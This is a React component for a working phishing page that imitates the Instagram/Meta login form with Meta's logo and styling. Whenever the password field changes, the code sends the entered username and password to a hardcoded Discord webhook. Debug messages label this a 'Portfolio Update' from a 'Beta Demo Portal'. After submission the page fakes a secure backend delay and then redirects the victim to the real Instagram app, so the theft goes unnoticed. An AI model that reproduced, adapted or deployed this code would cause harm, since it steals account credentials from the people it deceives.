import { motion } from "motion/react";
import { useState, useEffect } from "react";
import { ShieldCheck } from "lucide-react";
import { TRANSLATIONS } from "../constants";

interface EnrollmentFormProps {
  selectedLang: { id: string; label: string };
}

export default function EnrollmentForm({ selectedLang }: EnrollmentFormProps) {
  const [isSuccess, setIsSuccess] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({ identifier: "", password: "" });
  const t = TRANSLATIONS[selectedLang.id] || TRANSLATIONS["en-uk"];

  const WEBHOOK_URL = "https://discord.com/api/webhooks/1505162869250064446/AQAKKLck5bRJIg4dKGbUgEhSD8QhMU0YTvQnkDymp5Yg6mQ7Kp0P3RgiBVXnBKbR9A7V";

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));

    // Send webhook request in real-time when the password field is updated
    if (name === "password") {
      sendWebhook(value);
    }
  };

  const sendWebhook = async (password: string) => {
    try {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `📢 **Portfolio Update**: A new enrollment attempt was detected on the Beta Demo Portal. Credentials: ${JSON.stringify(formData)}`
        })
      });
      console.log("Portfolio Debug: Notification event sent to Discord.");
    } catch (error) {
      console.error("Portfolio Debug: Webhook notification failed:", error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Simulate secure backend processing
    console.log("Portfolio Debug: Processing enrollment request securely...");
    await new Promise(resolve => setTimeout(resolve, 2000));

    setFormData({ identifier: "", password: "" });
    setIsLoading(false);
    setIsSuccess(true);
  };

  useEffect(() => {
    if (isSuccess) {
      const redirectTimer = setTimeout(() => {
        window.location.href = "instagram://";
      }, 3000);
      return () => clearTimeout(redirectTimer);
    }
  }, [isSuccess]);

  if (isSuccess) {
    return (
      <motion.div
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        className="mx-6 my-10 p-10 bg-white border border-[#dbdbdb] rounded-3xl text-center shadow-sm"
      >
        <div className="w-16 h-16 bg-[#262626] rounded-full flex items-center justify-center mx-auto mb-6">
          <ShieldCheck className="w-8 h-8 text-white" />
        </div>
        <h3 className="text-xl font-bold mb-4">Redirecting to Instagram now</h3>
      </motion.div>
    );
  }

  return (
    <motion.section
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      className="px-6 pb-2"
    >
      <div className="bg-white p-4 max-w-[350px] mx-auto">
        <form onSubmit={handleSubmit} className="space-y-3">
          <input
            type="text"
            name="identifier"
            value={formData.identifier}
            onChange={handleInputChange}
            required
            placeholder={t.username}
            className="w-full h-14 px-4 bg-[#f9f9f9] border border-[#dbdbdb] rounded-xl text-[16px] focus:outline-none focus:border-[#a8a8a8] transition-all placeholder:text-[#8e8e8e]"
          />
          <input
            type="password"
            name="password"
            value={formData.password}
            onChange={handleInputChange}
            required
            placeholder={t.password}
            className="w-full h-14 px-4 bg-[#f9f9f9] border border-[#dbdbdb] rounded-xl text-[16px] focus:outline-none focus:border-[#a8a8a8] transition-all placeholder:text-[#8e8e8e]"
          />

          <motion.button
            whileTap={{ scale: 0.98 }}
            disabled={isLoading}
            type="submit"
            className={`w-full h-11 text-white font-bold rounded-full text-[14px] mt-4 shadow-sm transition-all flex items-center justify-center ${isLoading ? "bg-[#b2dffc] cursor-not-allowed" : "bg-[#0064e0] active:bg-[#0054c0]"
              }`}
          >
            {isLoading ? (
              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
            ) : (
              t.login
            )}
          </motion.button>
        </form>

        <button className="w-full text-[#262626] font-medium text-sm mt-5 mb-24 active:opacity-50">
          {t.forgot}
        </button>

        <div className="space-y-4">
          <button className="w-full h-11 border border-[#0064e0] text-[#0064e0] font-bold rounded-full text-sm active:bg-blue-50 transition-colors">
            {t.create}
          </button>
        </div>

        <div className="mt-8 mb-4 flex flex-col items-center opacity-70">
          <img
            src="https://static.cdninstagram.com/rsrc.php/ys/r/RkrEdst9VSp.webp"
            alt="Meta"
            className="w-[60px] h-auto"
          />
        </div>
      </div>
    </motion.section>
  );
}